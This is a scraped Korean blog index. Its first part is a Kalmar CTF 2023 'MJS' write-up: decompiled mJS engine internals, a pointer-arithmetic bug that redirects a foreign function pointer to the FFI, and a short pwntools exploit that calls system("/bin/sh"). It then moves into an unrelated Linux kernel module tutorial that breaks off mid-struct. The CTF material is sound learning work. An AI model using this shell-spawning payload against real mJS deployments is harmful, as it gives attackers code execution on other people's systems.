[rbp-E8h] mjs_val_t v1; // [rsp+160h] [rbp-E0h] mjs_val_t key_0; // [rsp+170h] [rbp-D0h] mjs_val_t obj_0; // [rsp+178h] [rbp-C8h] unsigned int ival; // [rsp+188h] [rbp-B8h] int ikey; // [rsp+18Ch] [rbp-B4h] mjs_val_t key; // [rsp+190h] [rbp-B0h] mjs_val_t obj; // [rsp+198h] [rbp-A8h] mjs_val_t val_0; // [rsp+1A0h] [rbp-A0h] double a_7; // [rsp+1A8h] [rbp-98h] double b_5; // [rsp+1B0h] [rbp-90h] double a_6; // [rsp+1B8h] [rbp-88h] double b_4; // [rsp+1C0h] [rbp-80h] double a_5; // [rsp+1C8h] [rbp-78h] double b_3; // [rsp+1D0h] [rbp-70h] double a_4; // [rsp+1D8h] [rbp-68h] double b_2; // [rsp+1E0h] [rbp-60h] mjs_val_t b_1; // [rsp+1E8h] [rbp-58h] mjs_val_t a_3; // [rsp+1F0h] [rbp-50h] mjs_val_t b_0; // [rsp+1F8h] [rbp-48h] mjs_val_t a_2; // [rsp+200h] [rbp-40h] double a_1; // [rsp+208h] [rbp-38h] mjs_val_t val; // [rsp+210h] [rbp-30h] double a_0; // [rsp+218h] [rbp-28h] mjs_val_t a; // [rsp+220h] [rbp-20h] mjs_val_t b; // [rsp+228h] [rbp-18h] switch ( op ) { case 4: case 20: case 50: return; case 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } else if ( mjs_is_foreign(obj) ) { ikey = mjs_get_int(mjs, key); ival = mjs_get_int(mjs, val_0); if ( !mjs_is_number(key) ) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;index must be a number\u0026#34;); mjs_push(mjs, 0xFFF3000000000000LL); return; } if ( mjs_is_number(val_0) \u0026amp;\u0026amp; ival \u0026lt; 0x100 ) { *((_BYTE *)mjs_get_ptr(mjs, obj) + ikey) = ival; } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;only number 0 .. 255 can be assigned\u0026#34;); val_0 = 0xFFF3000000000000LL; } } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;unsupported object type\u0026#34;); } mjs_push(mjs, val_0); return; case 12: case 13: case 14: case 15: case 16: case 17: case 18: case 19: case 26: case 27: case 48: b = mjs_pop(mjs); a = mjs_pop(mjs); v2 = do_op(mjs, a, b, op); mjs_push(mjs, v2); return; case 22: val = mjs_pop(mjs); is_truthy = mjs_is_truthy(mjs, val); v6 = mjs_mk_boolean(mjs, is_truthy == 0); mjs_push(mjs, v6); return; case 23: v7 = mjs_pop(mjs); a_1 = mjs_get_double(mjs, v7); v8 = mjs_mk_number(mjs, (double)~(int)a_1); mjs_push(mjs, v8); return; case 24: v13 = mjs_pop(mjs); b_2 = mjs_get_double(mjs, v13); v14 = mjs_pop(mjs); a_4 = mjs_get_double(mjs, v14); v15 = mjs_mk_boolean(mjs, b_2 \u0026gt; a_4); mjs_push(mjs, v15); return; case 25: v16 = mjs_pop(mjs); b_3 = mjs_get_double(mjs, v16); v17 = mjs_pop(mjs); a_5 = mjs_get_double(mjs, v17); v18 = mjs_mk_boolean(mjs, a_5 \u0026gt; b_3); mjs_push(mjs, v18); return; case 28: obj_2 = mjs_pop(mjs); key_2 = mjs_pop(mjs); if ( !mjs_is_object(obj_2) || !mjs_is_string(key_2) ) goto LABEL_32; v = mjs_get_v(mjs, obj_2, key_2); v27 = mjs_mk_number(mjs, 1.0); v_1 = do_op(mjs, v, v27, 14); mjs_set_v(mjs, obj_2, key_2, v_1); mjs_push(mjs, v_1); return; case 29: obj_3 = mjs_pop(mjs); key_3 = mjs_pop(mjs); if ( !mjs_is_object(obj_3) || !mjs_is_string(key_3) ) goto LABEL_28; v32 = mjs_get_v(mjs, obj_3, key_3); v28 = mjs_mk_number(mjs, 1.0); v_2 = do_op(mjs, v32, v28, 13); mjs_set_v(mjs, obj_3, key_3, v_2); mjs_push(mjs, v_2); return; case 30: op_assign(mjs, 13); return; case 31: op_assign(mjs, 14); return; case 32: op_assign(mjs, 12); return; case 33: op_assign(mjs, 15); return; case 34: op_assign(mjs, 17); return; case 35: op_assign(mjs, 18); return; case 36: op_assign(mjs, 16); return; case 37: op_assign(mjs, 19); return; case 38: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \u0026#34;Use ===, not ==\u0026#34;); return; case 39: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \u0026#34;Use !==, not !=\u0026#34;); return; case 40: v19 = mjs_pop(mjs); b_4 = mjs_get_double(mjs, v19); v20 = mjs_pop(mjs); a_6 = mjs_get_double(mjs, v20); v21 = mjs_mk_boolean(mjs, b_4 \u0026gt;= a_6); mjs_push(mjs, v21); return; case 41: v22 = mjs_pop(mjs); b_5 = mjs_get_double(mjs, v22); v23 = mjs_pop(mjs); a_7 = mjs_get_double(mjs, v23); v24 = mjs_mk_boolean(mjs, a_7 \u0026gt;= b_5); mjs_push(mjs, v24); return; case 44: a_2 = mjs_pop(mjs); b_0 = mjs_pop(mjs); v9 = check_equal(mjs, a_2, b_0); v10 = mjs_mk_boolean(mjs, v9); mjs_push(mjs, v10); return; case 45: a_3 = mjs_pop(mjs); b_1 = mjs_pop(mjs); v11 = check_equal(mjs, a_3, b_1); v12 = mjs_mk_boolean(mjs, v11 == 0); mjs_push(mjs, v12); return; case 46: op_assign(mjs, 26); return; case 47: op_assign(mjs, 27); return; case 49: op_assign(mjs, 48); return; case 51: v3 = mjs_pop(mjs); a_0 = mjs_get_double(mjs, v3); v4 = mjs_mk_number(mjs, COERCE_DOUBLE(*(_QWORD *)\u0026amp;a_0 ^ 0x8000000000000000LL)); mjs_push(mjs, v4); return; case 52: obj_0 = mjs_pop(mjs); key_0 = mjs_pop(mjs); if ( mjs_is_object(obj_0) \u0026amp;\u0026amp; mjs_is_string(key_0) ) { v35 = mjs_get_v(mjs, obj_0, key_0); v25 = mjs_mk_number(mjs, 1.0); v1 = do_op(mjs, v35, v25, 13); mjs_set_v(mjs, obj_0, key_0, v1); mjs_push(mjs, v35); } else { LABEL_28: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operand for ++\u0026#34;); } return; case 53: obj_1 = mjs_pop(mjs); key_1 = mjs_pop(mjs); if ( mjs_is_object(obj_1) \u0026amp;\u0026amp; mjs_is_string(key_1) ) { v34 = mjs_get_v(mjs, obj_1, key_1); v26 = mjs_mk_number(mjs, 1.0); v1_0 = do_op(mjs, v34, v26, 14); mjs_set_v(mjs, obj_1, key_1, v1_0); mjs_push(mjs, v34); } else { LABEL_32: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operand for --\u0026#34;); } return; case 227: v29 = mjs_pop(mjs); v30 = mjs_typeof(v29); v31 = mjs_mk_string(mjs, v30, 0xFFFFFFFFFFFFFFFFLL, 1); mjs_push(mjs, v31); return; default: if ( cs_log_print_prefix(LL_ERROR, \u0026#34;src/mjs_exec.c\u0026#34;, 431) ) cs_log_printf(\u0026#34;Unknown expr: %d\u0026#34;, (unsigned int)op); return; } } scope의 변수에 넣어주는 기능도 수행한다. 나머진 제대로 분석안했다.\nExploitation 파싱할때 ()를 통해서 함수를 호출하는 바이트 코드를 점화할 수 있다. exec_expr에서 함수 포인터가 위에 마스크를 달고 raw 하게 저장됨을 알 수 있다. 사실 아주 당연한 내용이지만, js 엔진 건드려본적이 없어서 잘 몰랐다.\ncase 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } mjs_err_t __cdecl mjs_set_v(mjs *mjs, mjs_val_t obj, mjs_val_t name, mjs_val_t val) { return mjs_set_internal(mjs, obj, name, 0LL, 0LL, val); } mjs_err_t __cdecl mjs_set_internal( mjs *mjs, mjs_val_t obj, mjs_val_t name_v, char *name, size_t name_len, mjs_val_t val) { mjs_object *o; // [rsp+8h] [rbp-58h] int need_free; // [rsp+14h] [rbp-4Ch] BYREF mjs_property *p; // [rsp+18h] [rbp-48h] mjs_err_t rcode; // [rsp+24h] [rbp-3Ch] mjs_val_t vala; // [rsp+28h] [rbp-38h] size_t name_lena; // [rsp+30h] [rbp-30h] BYREF char *namea; // [rsp+38h] [rbp-28h] BYREF mjs_val_t name_va; // [rsp+40h] [rbp-20h] BYREF mjs_val_t obja; // [rsp+48h] [rbp-18h] mjs *mjsa; // [rsp+50h] [rbp-10h] mjsa = mjs; obja = obj; name_va = name_v; namea = name; name_lena = name_len; vala = val; rcode = MJS_OK; need_free = 0; if ( name ) { name_va = 0xFFF3000000000000LL; } else { rcode = mjs_to_string(mjsa, \u0026amp;name_va, \u0026amp;namea, \u0026amp;name_lena, \u0026amp;need_free); if ( rcode ) goto clean; } p = mjs_get_own_property(mjsa, obja, namea, name_lena); if ( !p ) { if ( !mjs_is_object(obja) ) return 2; if ( !mjs_is_string(name_va) ) name_va = mjs_mk_string(mjsa, namea, name_lena, 1); p = mjs_mk_property(mjsa, name_va, vala); o = get_object_struct(obja); p-\u0026gt;next = o-\u0026gt;properties; o-\u0026gt;properties = p; } p-\u0026gt;value = vala; clean: if ( need_free ) { free(namea); namea = 0LL; } return rcode; } mjs_property *__cdecl mjs_mk_property(mjs *mjs, mjs_val_t name, mjs_val_t value) { mjs_property *result; // rax result = new_property(mjs); result-\u0026gt;next = 0LL; result-\u0026gt;name = name; result-\u0026gt;value = value; return result; } value가 그대로 저장된다. 이걸로 scope에 foreign 함수 포인터를 raw하게 저장시킬 수 있다. 이제 여기서 함수 포인터에 대한 연산을 수행할 수 있다. do_op 함수의 일부 코드를 보면 왜 가능한지 알 수 있다.\n} else if (mjs_is_foreign(a) || mjs_is_foreign(b)) { /* * When one of the operands is a pointer, only + and - are supported, * and the result is a pointer. */ if (op != TOK_MINUS \u0026amp;\u0026amp; op != TOK_PLUS) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \u0026#34;invalid operands\u0026#34;); } is_result_ptr = 1; 하나만 foreign pointer를 주고 그냥 상수를 더하면 된다.\n► 0x5647fc468aec \u0026lt;exec_expr+124\u0026gt; call do_op \u0026lt;do_op\u0026gt; rdi: 0x5647fe14f2a0 ◂— 0x0 rsi: 0xfff25647fc465660 rdx: 0x403e000000000000 rcx: 0xd 실제로 연산이 될때 raw 하게 들어가는 것을 볼 수 있다. do_op에서는 do_arith_op을 호출한다.\nstatic double do_arith_op(double da, double db, int op, bool *resnan) { *resnan = false; if (isnan(da) || isnan(db)) { *resnan = true; return 0; } /* clang-format off */ switch (op) { case TOK_MINUS: return da - db; case TOK_PLUS: return da + db; case TOK_MUL: return da * db; case TOK_DIV: if (db != 0) { return da / db; } else { /* TODO(dfrank): add support for Infinity and return it here */ *resnan = true; return 0; } case TOK_REM: /* * TODO(dfrank): probably support remainder operation as it is in JS * (which works with non-integer divisor). */ db = (int) db; if (db != 0) { bool neg = false; if (da \u0026lt; 0) { neg = true; da = -da; } if (db \u0026lt; 0) { db = -db; } da = (double) ((int64_t) da % (int64_t) db); if (neg) { da = -da; } return da; } else { *resnan = true; return 0; } case TOK_AND: return (double) ((int64_t) da \u0026amp; (int64_t) db); case TOK_OR: return (double) ((int64_t) da | (int64_t) db); case TOK_XOR: return (double) ((int64_t) da ^ (int64_t) db); case TOK_LSHIFT: return (double) ((int64_t) da \u0026lt;\u0026lt; (int64_t) db); case TOK_RSHIFT: return (double) ((int64_t) da \u0026gt;\u0026gt; (int64_t) db); case TOK_URSHIFT: return (double) ((uint32_t) da \u0026gt;\u0026gt; (uint32_t) db); } /* clang-format on */ *resnan = true; return 0; } 그대로 연산이 되는데 상위 2바이트를 침범하면, type confusion?도 가능할 것 같다. 어쨌든 여기서 foreign pointer와 연산이 되면, 다른 함수를 호출할 수 있다.\n상위 2바이트만 안건들면 그대로 연산이 되고 0xfff2가 남아서 foreign pointer로 인식되고 OP_CALL로 함수 포인터를 호출할 수 있다. SCOPE에 그대로 저장되기 때문에 그냥 호출하면 된다.\npatch.diff에서 ffi 등록하는 코드를 지웠지만, ffi의 코드는 남아있기 때문에 ffi로 점프하면 된다.\nmjs_err_t __cdecl mjs_ffi_call(mjs *mjs) mjs_ffi_call로 점프해주면 된다.\nmjs_ffi_ctype_t __cdecl parse_cval_type(mjs *mjs, const char *s, const char *e) { bool v4; // [rsp+Eh] [rbp-32h] bool v5; // [rsp+Fh] [rbp-31h] mg_str ms; // [rsp+10h] [rbp-30h] BYREF const char *ea; // [rsp+20h] [rbp-20h] const char *sa; // [rsp+28h] [rbp-18h] mjs *mjsa; // [rsp+30h] [rbp-10h] mjsa = mjs; sa = s; ea = e; memset(\u0026amp;ms, 0, sizeof(ms)); while ( 1 ) { v5 = 0; if ( sa \u0026lt; ea ) v5 = ((*__ctype_b_loc())[*sa] \u0026amp; 0x2000) != 0; if ( !v5 ) break; ++sa; } while ( 1 ) { v4 = 0; if ( ea \u0026gt; sa ) v4 = ((*__ctype_b_loc())[*(ea - 1)] \u0026amp; 0x2000) != 0; if ( !v4 ) break; --ea; } ms.p = sa; ms.len = ea - sa; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;void\u0026#34;) ) return 0; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;userdata\u0026#34;) ) return 1; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;int\u0026#34;) ) return 3; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;bool\u0026#34;) ) return 4; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;double\u0026#34;) ) return 5; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;float\u0026#34;) ) return 6; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;char*\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;char *\u0026#34;) ) return 7; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;void*\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;void *\u0026#34;) ) return 8; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str\u0026#34;) ) return 10; if ( !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str *\u0026#34;) || !mg_vcmp(\u0026amp;ms, \u0026#34;struct mg_str*\u0026#34;) ) return 9; mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \u0026#34;failed to parse val type \\\u0026#34;%.*s\\\u0026#34;\u0026#34;, LODWORD(ms.len), ms.p); return 11; } 이거 보고 잘 맞춰서 세팅해준다음에, system /bin/sh를 호출하면 된다. offset 잘 계산하면 system 주소를 넣어줄 수 있다.\nExploit script 익스플로잇이 되게 화가 난다.\nfrom pwn import * off = 0x6ab0 payload = \u0026#39;let a = print;a+=0x6ab0;a(\u0026#34;int system(char*)\u0026#34;)(\u0026#34;/bin/sh\u0026#34;)\u0026#39; p = process([\u0026#34;./mjs\u0026#34;,\u0026#34;-e\u0026#34;,payload]) p.interactive() ","permalink":"https://msh1307.kr/blog/kalmar_ctf_2023_mjs/","summary":"MJS CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다. 구글링 잘했으면 바로 풀 수 있었을 것 같다.\nAnalysis FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update RUN apt-get install -y xinetd python3 xxd COPY mjs / COPY ynetd / COPY remote.py / RUN echo \u0026#34;kalmar{redacted}\u0026#34; \u0026gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt USER 1000:1000 EXPOSE 10002 CMD ./ynetd -p 10002 \u0026#34;timeout 60 ./remote.py\u0026#34; 22.04이다.\ndiff --git a/Makefile b/Makefile index d265d7e..d495e84 100644 --- a/Makefile +++ b/Makefile @@ -5,6 +5,7 @@ BUILD_DIR = build RD ?","title":"Kalmar CTF 2023 - MJS"},{"content":"Kernel module? 모듈은 사용자의 혹은 커널의 요구로 읽혀지거나 아니면 없어지는 코드들로 이루어진 프로그램의 어떤 한 조각을 의미한다. 커널은 하나의 큰 모듈들의 집합이라고 볼 수 있다. 모듈들을 통해서 필요할때 더 추가, 혹은 제거를 통해서 커널을 재컴파일 혹은 재가동하지 않고도 커널의 기능을 확장하거나 축소시킬 수 있다.\nlsmod insmod rmmod lsmod를 통해서 현재 커널에 있는 모듈들의 정보를 확인할 수 있다. 이때 lsmod는 /proc/modules를 읽고나서 좀 더 예쁘게 바꿔준다. insmod를 통해서 커널에 모듈을 적재할 수 있다. rmmod를 통해서 커널에 적재된 모듈을 제거할 수 있다. Hello World /* * hello-1.c - The simplest kernel module. */ #include \u0026lt;linux/module.h\u0026gt; /* Needed by all modules */ #include \u0026lt;linux/kernel.h\u0026gt; /* Needed for KERN_INFO */ int init_module(void) { printk(KERN_INFO \u0026#34;Hello world 1.\\n\u0026#34;); /* * A non 0 return means init_module failed; module can\u0026#39;t be loaded. */ return 0; } void cleanup_module(void) { printk(KERN_INFO \u0026#34;Goodbye world 1.\\n\u0026#34;); } 커널 모듈은 최소 두가지 함수를 갖추고 있어야 한다. 하나는 init_module()이고 또 하나는 cleanup_module()이다. init_module은 insmod를 통해서 커널에 로딩될때 호출되는 초기화 함수이다. cleanup_module은 rmmod를 통해서 모듈이 제거될때 호출되는 함수다. 이름과 상관없이 init, cleanup 함수를 작성할 수 있다. 뒤에서 더 알아볼 예정이다.\nprintk, log level printk()는 유저와 통신하기 위한 함수가 아니다. 이 함수가 호출되면 커널의 logging mechanism이 수행되고, 이 logging mechanism은 수행한 함수의 정보를 기록하거나 경고를 알린다. 각각의 printk 선언은 우선순위를 통해서 제공되는데 그 우선순위는 아래와 같다.\nName\nString\nAlias function\nKERN_EMERG\n“0”\npr_emerg()\nKERN_ALERT\n“1”\npr_alert()\nKERN_CRIT\n“2”\npr_crit()\nKERN_ERR\n“3”\npr_err()\nKERN_WARNING\n“4”\npr_warn()\nKERN_NOTICE\n“5”\npr_notice()\nKERN_INFO\n“6”\npr_info()\nKERN_DEBUG\n“7”\npr_debug() and pr_devel() if DEBUG is defined\nKERN_DEFAULT\n“”\nKERN_CONT\n“c”\npr_cont()\n따로 우선순위를 명시하지 않았다면, DEFAULT_MESSAGE_LOGEVEL이 사용된다. int_console_loglevel에 따라서 더 높은 심각도, 즉 log level이 낮은 경우에 로그가 터미널에 출력된다.\ncat /proc/sys/kernel/printk 다음을 통해서 현재 터미널의 default log level을 확인할 수 있다.\n4 4 1 7 일반적으로 다음과 같은 결과가 나올텐데, 이때 가장 앞에 4가 console_loglevel이다. console log level(여기선 4)보다 심각도가 높으면 콘솔에 출력된다.\nKbuild kbuild system은 리눅스 버젼 2.6.x대에 도입된 새로운 kernel build system이다. kbuild는 모든 복잡성을 숨길수 있는 간단한 하나의 makefile을 제공한다. 이 makefile을 사용해서 make로 module을 build 할 수 있다.\nGoal Goal을 정의하는 것은 Kbuild에서 가장 중요한 부분이다. Goal은 build 과정을 통해 최종적으로 만들어져야 할 것, 컴파일 옵션, 사용되야하는 하위 디렉토리를 정의한다. 간단한 kbuild makefile의 일부를 확인해보면 아래와 같다.\nobj-y += foo.o 위 구문이 의미하는 바는 디렉토리 내에 foo.o란 이름의 한개의 오브젝트가 있다는 것이다. 만약 모듈로 만든다면 obj-m이란 변수가 사용된다. 즉 아래와 같이 된다.\nobj-$(CONFIG_FOO) += foo.o $(CONFIG_FOO)는 y(built-in)나 m(module)의 값을 갖는다. 만약 CONFIG_FOO가 y나 m의 값을 갖지 않는다면 이 파일은 컴파일되거나 링크되지 않는다.\nKernel Module Compile 앞에 hello world 예제를 Makefile로 컴파일해보면 아래와 같다.\nobj-m += hello-1.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean make -j `nproc을을 make modules make modules_install INSTALL_MOD_PATH=../../ 커널 빌드할때 modules_install을 해주고 얻은 경로를 -C로 넘겨주면 원하는 커널 버전에 맞게 커널 모듈을 빌드할 수 있다.\nall과 clean은 단순 사용자의 편의를 위해 추가되었다고 볼 수 있다. make로 컴파일을 하면, .o가 대체된 .ko 확장자를 가진 파일이 생긴다.\ninsmod를 통해 해당 모듈을 적재할 수 있고, rmmod를 통해 제거할 수 있다. /var/log/messages를 살펴보면, hello world 로그가 찍힌 것을 확인할 수 있다.\nHello World - 2 init과 cleanup 함수를 재명명할 수 있다. 이때 module_init과 module_exit 매크로가 필요하다. 위 매크로들은 linux/init.h에 정의되어 있다. 예제는 다음과 같다.\n/* * hello-2.c - Demonstrating the module_init() and module_exit() macros. * This is preferred over using init_module() and cleanup_module(). */ #include \u0026lt;linux/module.h\u0026gt; /* Needed by all modules */ #include \u0026lt;linux/kernel.h\u0026gt; /* Needed for KERN_INFO */ #include \u0026lt;linux/init.h\u0026gt; /* Needed for the macros */ static int __init hello_2_init(void) { printk(KERN_INFO \u0026#34;Hello, world 2\\n\u0026#34;); return 0; } static void __exit hello_2_exit(void) { printk(KERN_INFO \u0026#34;Goodbye, world 2\\n\u0026#34;); } module_init(hello_2_init); module_exit(hello_2_exit); Modules VS Programs 프로그램들은 보통 Main 함수부터 시작된다. 하지만 커널 모듈은 항상 _init_module 혹은 module_init 같은 함수의 호출로 시작된다. 위와 같은 함수들을 entry function이라고 부른다. entry function은 모듈의 시작을 의미하는데, 기능적으로 모듈이 어떤 역할을 하는지, 필요로 할때 모듈이 작동될 수 있도록 커널을 설정하는 역할을 한다.\n수행되고 나서 cleanup_module 혹은 module_exit 의 이름으로 사용자가 구체화한 함수의 호출을 통해 종료된다. 이와 같은 종료 함수는 entry function이 수행한 모든 기능들을 수행하기 전으로 되돌린다.\nFunctions available to modules 일반적으로 프로그램을 작성할때, printf 같은 자신이 정의하지 않은 라이브러리 함수를 사용한다. 이때 printf 같은 라이브러리 함수들은 나중에 사용되기 위해서 linking을 거치게 된다.\n하지만 커널 모듈은 이런 부분에서 일반적인 프로그램과 다르다. 위에서 작성한 hello world 모듈을 예로 들어보면, printk 라는 라이브러리 함수를 사용했지만 실제로 I/O library를 include 하지 않았다. 그 이유는 모듈은 insmod가 수행되면서, printk와 같은 함수들의 symbol이 결정되는 object file이기 때문이다. 각 symbols의 함수적 정의는 커널이 제공한다. 이러한 symbol들은 /proc/kallsyms에서 확인할 수 있다.\nUser Space VS Kernel Space 커널은 유저에게 자원에 대한 접근 권한을 부여하지 않는다. 다음 사진은 인텔 기준으로 총 4개의 ring이 있다. OS가 CPU를 사용할때, 사용자가 CPU가 사용할때를 나눠놓았다. 별다른 의미는 없다. 라이브러리 함수도 자원에 액세스해야할때는 Kernel에게 요청한다. 그 요청을 syscall이라고 한다. syscall을 하면, Kernel에 그 syscall에 알맞는 처리를 해주고, 사용자에게 알려준다. 예를 들어 printf가 호출될때, printf는 format에 맞춘다던가 하는 처리를 해주고 결국 write syscall을 호출한다. 이때 커널이 superviser mode로 IO를 처리해주고, user mode로 돌아온다. printf 함수를 일종의 거대한 wrapper로 볼 수 있다.\nName Space C 프로그램을 작성할때, 일반적으로 프로그래머는 가독성을 보장하는 변수를 사용한다. 만약 다른 사람의 전역변수에 해당하는 전역변수명을 재사용한다면, namespace pollution 문제가 생긴다.\n커널에서 아주 작은 모듈이라고 할지라도 작성된 모듈이 커널 전체에 linking 될텐데 위 문제를 고려한다면 이것은 분명히 주목할만한 문제가 된다. 위 문제점을 피하기 위한 가장 좋은 방법은, 프로그래머만의 잘 정의된 prefix를 사용하고, 모두 static으로 정의하는 것이다.\nCode Space 프로세스가 만들어졌을때, 커널은 가상 메모리를 프로세스에게 할당한다. 그리고 프로세스를 위해 할당된 메모리 주소는 서로 겹치지 않는다. 예를 들어 각각의 프로세스들이 0xbffff978 라는 주소에 접근할때 실제로 접근하는 물리적 메모리의 주소는 다르다. 일종의 offset 개념으로 위와 같은 주소를 사용한다. 대부분의 경우 프로세스는 다른 프로세스의 메모리 영역에 접근하지 못한다.\n커널은 위 논리에 맞게 자신만의 메모리 영역을 가지고 있다. 모듈은 커널에 동적으로 탑재되고 제거될수 있으므로 각각의 모듈들은 자신만의 메모리보다 커널의 code space를 공유한다. 그래서 만약 어떤 모듈이 segfault 같은 에러를 발생시킨다면, kernel panic이 발생하게 된다.\nDevice drivers 드라이버는 모듈의 종류중 하나인데, 하드웨어를 위한 기능을 제공한다. 리눅스에서 VFS를 지원해서 통일되게 파일들을 다룰 수 있다. 각각의 하드웨어는 /dev에 위치해있는 파일 이름으로 나타내어질 수 있다. VFS 덕분에 간단하게 파일을 다루듯이 read, write 등의 연산을 통해서 하드웨어를 컨트롤 할 수 있다. application이 파일에 대한 IO를 수행하게 되면, 일반적으로 VFS는 inode 메타데이터를 확인해서 특정 파일시스템의 fops를 찾게 되며, 이 fops를 기반으로 read, write 등을 수행한다. 만약 device file이라면, major number를 통해 device driver를 찾는다. 이때 device driver의 초기화 과정에서 등록된 fops를 기반으로 호출하게 된다.\nMajor \u0026amp; Minor Numbers 다음 표는 3개의 IDE hard drive에 대한 정보가 나타나 있다.\n# ls -l /dev/hda[1-3] brw-rw---- 1 root disk 3, 1 Jul 5 2000 /dev/hda1 brw-rw---- 1 root disk 3, 2 Jul 5 2000 /dev/hda2 brw-rw---- 1 root disk 3, 3 Jul 5 2000 /dev/hda3 컴마 이후의 숫자는 장치의 major number를 나타낸다. 두번째 번호는 minor number를 나타낸다. major number는 어떤 드라이버가 하드웨어에 접근하기 위해 사용되는가를 나타낸다.\n각각의 드라이버는 고유의 major number가 부여되어있다. 만약 모든 major number가 같다면, 해당 major number가 부여된 장치들은 모두 같은 드라이버에 의해 컨트롤 됨을 나타낸다.\nminor number는 같은 드라이버에 의해 컨트롤되는 장치들을 구분하기 위한 용도로 사용된다.\nDevice files 장치들은 두가지 타입 : character device와 block device로 나뉜다.\nblock device와 character device의 가장 큰 차이점은 Application의 I/O 요구가 있을 시, 데이터를 File System에서 읽어오느냐 Character Device(Raw device)에서 읽어오느냐의 차이다.\nblock device는 System Buffer를 사용하여 블록이나 섹터 등의 정해진 단위로 데이터를 전송한다. hdd나 CD/DVD 같은 것들이 block device라고 볼 수 있다. I/O 전송 속도가 높은것이 특징이다.\ncharacter device는 block device와는 달리 buffer를 따로 사용하지 않는다. 그래서 output이 block device에 비해서 유동적이다. 버퍼 처리를 Application이 제어해서 속도도 Application에 따라서 다를 수 있다.\n# ls -l /dev/hda[1-3] brw-rw---- 1 root disk 3, 1 Jul 5 2000 /dev/hda1 brw-rw---- 1 root disk 3, 2 Jul 5 2000 /dev/hda2 brw-rw---- 1 root disk 3, 3 Jul 5 2000 /dev/hda3 character device와 block device는 가장 앞에 문자를 보고 알 수 있다. 여기선 모두 b로 block device이다. character device는 c로 표시된다.\n시스템에 설치된 모든 device 파일들은 mknod를 통해 생성되었다. major number가 12, minor number로 2를 가지는 coffee 라는 이름의 character device를 생성하기 위해서는 mknod /dev/coffee c 12 2를 입력하면 된다. 꼭 device file이 /dev에만 있어야 하는것은 아니지만 일반적으로 잘 관리하기 위해서 /dev에 많이 넣는다.\ndevice file에 어떤 장치가 접근하려 할때, 커널은 device file의 major number를 사용해서 어떤 드라이버가 해당 device file에 대한 접근을 제어하기 위해서 사용되는지 판단한다.\n즉, minor number는 커널에게 별 의미없는 숫자라고 말할 수 있다. 유일하게 드라이버가 minor number를 사용해 여러가지 하드웨어들을 구분한다. 여기서 하드웨어는 조금 추상적인 상태의 하드웨어를 의미한다. 다음 두개의 디바이스 파일을 살펴보자.\n% ls -l /dev/fd0 /dev/fd0u1680 brwxrwxrwx 1 root floppy 2, 0 Jul 5 2000 /dev/fd0 brw-rw---- 1 root floppy 2, 44 Jul 5 2000 /dev/fd0u1680 하나의 플로피 디스크를 넣더라도, 위와 같은 결과가 나올것이다. 그 이유는 하나의 플로피 디스크가 두 개의 서로 다른 minor number를 가지고 있기 때문이다. 위 예시 때문에 조금 추상적인 상태의 하드웨어라고 언급한 것이다.\nfile_operations structure file_operations 구조체는 /linux/fs.h에 정의되어있다. 구조체의 각각의 부분은 드라이버가 정의한 어떤 함수들의 주소에 대응된다.\n다음은 file_operations 구조체이다.\nstruct file_operations { struct module *owner; loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*read_iter) (struct kiocb *, struct iov_iter *); ssize_t (*write_iter) (struct kiocb *, struct iov_iter *); int (*iterate) (struct file *, struct dir_context *); int (*iterate_shared) (struct file *, struct dir_context *); __poll_t (*poll) (struct file *, struct poll_table_struct *); long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); unsigned long mmap_supported_flags; int (*open) (struct inode *, struct file *); int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); int (*fsync) (struct file *, loff_t, loff_t, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*setfl)(struct file *, unsigned long); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **, void **); long (*fallocate)(struct file *file, int mode, loff_t offset,loff_t len); void (*show_fdinfo)(struct seq_file *m, 